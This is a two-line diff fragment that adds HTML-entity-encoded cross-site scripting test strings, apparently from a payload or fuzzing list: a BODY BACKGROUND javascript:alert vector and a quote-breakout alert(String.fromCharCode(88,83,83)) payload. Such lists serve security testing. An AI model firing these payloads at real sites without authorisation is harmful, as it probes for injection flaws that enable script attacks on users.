@@ -1,0 +1,2 @@
+;&gt; &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; &lt;
+&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;
